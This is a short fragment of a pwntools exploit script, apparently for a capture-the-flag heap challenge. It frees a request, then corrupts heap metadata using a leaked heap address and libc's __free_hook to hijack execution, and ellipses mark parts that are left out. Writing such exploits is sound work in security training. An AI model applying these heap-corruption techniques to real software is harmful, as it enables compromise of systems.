...
#gdb.attach(r,"")
delete_request(3)
modify_request(2,p64(heap_leak+0x960)+p64(0)+p64(heap_leak)+p32(0x2),1111,0x5,b"1\n")
r.sendline("4")
...
modify_request(2,p64(libc.symbols["__free_hook"])+p64(0)+p64(heap_leak)+p32(0x2),1111,0x5,b"1\n")
